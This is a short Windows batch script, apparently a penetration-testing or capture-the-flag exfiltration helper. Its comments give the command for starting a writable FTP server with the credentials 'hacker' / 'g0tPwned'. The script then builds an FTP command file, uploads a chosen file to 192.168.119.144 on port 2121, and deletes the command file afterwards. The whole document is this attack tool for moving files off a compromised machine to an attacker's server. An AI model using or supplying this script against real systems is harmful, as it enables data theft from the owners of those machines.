:: start listening server with:
:: python3 -m pyftpdlib -w -u hacker -P g0tPwned
@echo off
:: change server IP and Port as required
echo open 192.168.119.144 2121> ftpcmd.dat
echo user hacker>> ftpcmd.dat
echo g0tPwned>> ftpcmd.dat
echo bin>> ftpcmd.dat
echo put %1>> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat
del ftpcmd.dat